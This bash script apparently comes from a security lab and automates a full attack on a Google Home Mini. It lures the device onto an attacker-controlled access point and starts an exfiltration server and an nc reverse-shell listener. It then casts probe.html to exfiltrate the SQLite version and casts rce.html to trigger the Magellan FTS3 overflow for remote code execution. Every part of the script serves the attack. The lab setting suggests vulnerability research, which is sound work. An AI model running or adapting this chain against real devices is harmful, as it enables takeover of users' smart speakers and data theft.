#!/usr/bin/env bash
# Magellan full chain — provisions Mini onto Pi AP, then drives the exploit.
#
# Steps:
#   1. Start lab AP (if not already up)
#   2. Start exfil + page server
#   3. Start reverse shell listener on PI_PORT
#   4. Provision the Mini (scripts/provision-wifi.py)
#   5. Wait for Mini to appear on DHCP, discover its IP
#   6. Send Cast LAUNCH → probe.html (confirm vulnerability)
#   7. If confirmed: send Cast LAUNCH → rce.html (trigger + shell)
#
# Usage:
#   bash scripts/magellan-full.sh \
#     --ssid gh-lab --pass ghlab12345 \
#     --pi-ip 10.42.0.1 [--port 4444] [--probe-only]

set -euo pipefail

SSID="${SSID:-gh-lab}"
PSK="${PSK:-ghlab12345}"
PI_IP="${PI_IP:-10.42.0.1}"
RPORT="${RPORT:-4444}"
AP_IFACE="${AP_IFACE:-wlan1}"
PROBE_ONLY=0

while [[ $# -gt 0 ]]; do
  case "$1" in
    --ssid)       SSID="$2"; shift 2 ;;
    --pass)       PSK="$2";  shift 2 ;;
    --pi-ip)      PI_IP="$2"; shift 2 ;;
    --port)       RPORT="$2"; shift 2 ;;
    --probe-only) PROBE_ONLY=1; shift ;;
    *) echo "Unknown: $1"; exit 1 ;;
  esac
done

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT="$SCRIPT_DIR/.."
MAGELLAN_DIR="$ROOT/reconstruction/exploit/magellan"

# ── 1. Ensure lab AP is running ─────────────────────────────────────────────
if ! ip addr show "$AP_IFACE" &>/dev/null; then
  echo "[!] AP iface $AP_IFACE not found. Set AP_IFACE= and run:"
  echo "    sudo bash scripts/lab-ap.sh start"
  exit 1
fi

# ── 2. Patch PI_IP into probe/rce pages ────────────────────────────────────
for page in probe.html rce.html; do
  path="$MAGELLAN_DIR/$page"
  if grep -q "PI_IP_PLACEHOLDER\|10\.42\.0\.1" "$path" 2>/dev/null; then
    sed -i "s/PI_IP_PLACEHOLDER/$PI_IP/g; \
            s/const PI.*=.*;/const PI = \"$PI_IP\";/g" "$path"
    echo "[*] Patched $page with PI=$PI_IP"
  fi
done

# ── 3. Start exfil server ───────────────────────────────────────────────────
echo "[*] Starting page/exfil server (ports 8080/8081)..."
python3 "$MAGELLAN_DIR/exfil_server.py" --ip "$PI_IP" &
EXFIL_PID=$!
trap "kill $EXFIL_PID $LISTEN_PID 2>/dev/null; echo '[*] Cleanup done'" EXIT INT TERM

sleep 0.5

# ── 4. Start reverse shell listener ────────────────────────────────────────
if [[ "$PROBE_ONLY" -eq 0 ]]; then
  echo "[*] Listening for reverse shell on :$RPORT ..."
  nc -lvnp "$RPORT" &
  LISTEN_PID=$!
fi

# ── 5. Provision the Mini ───────────────────────────────────────────────────
echo ""
echo "[*] Provisioning Mini onto $SSID ..."
python3 "$ROOT/scripts/provision-wifi.py" \
  --ssid "$SSID" --pass "$PSK" --keep 2>&1 | tee /tmp/provision.log

# ── 6. Find Mini's IP ──────────────────────────────────────────────────────
echo ""
echo "[*] Finding Mini on the AP..."
MINI_IP=""
for attempt in $(seq 1 30); do
  # Try DHCP lease table, mDNS, and arp
  MINI_IP=$(grep -E "GoogleHome|44:07:0B" /var/lib/misc/dnsmasq.leases 2>/dev/null \
    | awk '{print $3}' | head -1 || true)
  [[ -z "$MINI_IP" ]] && \
    MINI_IP=$(arp-scan --interface="$AP_IFACE" --localnet 2>/dev/null \
      | grep -i "44:07:0b" | awk '{print $1}' | head -1 || true)
  [[ -n "$MINI_IP" ]] && break
  sleep 2
  echo -n "."
done
echo ""

if [[ -z "$MINI_IP" ]]; then
  echo "[!] Could not find Mini's IP. Check DHCP log:"
  echo "    cat /var/lib/misc/dnsmasq.leases"
  echo "    Or: arp-scan --interface=$AP_IFACE --localnet"
  echo ""
  read -r -p "Enter Mini IP manually: " MINI_IP
fi
echo "[*] Mini IP: $MINI_IP"

# ── 7. Wait for port 8009 (Cast receiver comes up ~10s after provisioning) ──
echo "[*] Waiting for Cast port 8009..."
for i in $(seq 1 30); do
  if nc -z -w2 "$MINI_IP" 8009 2>/dev/null; then
    echo "[+] Cast port open!"
    break
  fi
  sleep 2
  echo -n "."
done
echo ""

# ── 8. Probe first ─────────────────────────────────────────────────────────
echo "[*] Casting probe.html → confirms SQLite version..."
python3 "$MAGELLAN_DIR/cast_launch.py" \
    "$MINI_IP" "http://${PI_IP}:8080/probe.html"

echo ""
echo "[*] Waiting 25s for probe.html to run and exfil results..."
sleep 25

if [[ "$PROBE_ONLY" -eq 1 ]]; then
  echo "[*] --probe-only set. Done. Check exfil output above."
  exit 0
fi

# ── 9. RCE page ─────────────────────────────────────────────────────────────
echo ""
read -r -p "Probe done. Launch RCE page? [y/N] " yn
[[ "$yn" != "y" && "$yn" != "Y" ]] && exit 0

echo "[*] Casting rce.html → Magellan FTS3 overflow..."
python3 "$MAGELLAN_DIR/cast_launch.py" \
    "$MINI_IP" "http://${PI_IP}:8080/rce.html"

echo ""
echo "[*] Waiting for reverse shell or crash signal (60s)..."
sleep 60
echo "[*] Done. Check the nc listener output above."
